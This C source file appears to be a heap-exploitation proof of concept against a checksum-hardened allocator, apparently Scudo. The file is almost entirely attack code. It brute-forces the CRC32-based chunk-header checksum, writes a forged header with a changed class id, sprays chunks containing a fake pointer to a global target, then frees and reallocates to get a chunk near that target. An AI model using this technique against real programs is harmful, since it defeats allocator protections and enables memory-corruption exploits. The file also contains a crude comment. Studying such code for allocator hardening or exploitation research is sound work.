#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#define CRC32_(crc, value) __asm__("crc32\t" "(%1), %0" : "=r"(crc) : "r"(value), "0"(crc))

u_int32_t crc32(u_int32_t crc, void const *buf) {
        size_t crc0 = crc;
        CRC32_(crc0, &buf);
        return crc0;
}

size_t find_cksum(size_t cksum_inuse, int old_state, int new_state){ // Checksum while chunk is in use.
	unsigned int i=0;
        unsigned int _crc = 0;
        char *chunk_ptr = 0x41414141; // Doesn't really matter as you can guess. (Since it's constant)

        do{
                i++;
                _crc = crc32(crc32(i, chunk_ptr), old_state);
                _crc = _crc ^ _crc>>0x10;
        }while(_crc!=cksum_inuse);
        _crc = crc32(crc32(i, chunk_ptr), new_state);
        _crc = _crc ^ _crc>>0x10;

		//only 16 bits, so keep the bottom 2
        return _crc&0xffff;
}

enum AllocationState { Available = 0, Allocated = 1, Quarantined = 2};

int make_state(int classId, enum AllocationState state, int size) {
	return classId | (state << 8) | (size << 12);
}


unsigned long big[0x2000] = {0};
char globalTarget[64];

//NOTE: EXPORT UR FUCCIN VARS BEFORE RJUNNING NERD
int main() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	unsigned long * chunk = malloc(0x40);
	size_t normal_cksum = (*(chunk-2)) >> 48;

	int old_state = make_state(4, Allocated, 0x40);
	int new_state = make_state(0, Allocated, 0x40);

	size_t corrupted_cksum = find_cksum(normal_cksum, old_state, new_state);

	(*(chunk-2)) = (corrupted_cksum << 48) | new_state;

	for (int i = 0 ; i < 0x1000 ; i++) {
		unsigned long * tmp = malloc(0x40);

		tmp[0] = 0;
		tmp[1] = 0;
		tmp[2] = globalTarget - 0x50;
		tmp[3] = 0x20050;
	}

	free(chunk);

	unsigned long * forged = malloc(0x20000);

	printf("forged chunk is at %p\n", forged);
	printf("target is at %p\n", globalTarget);
}
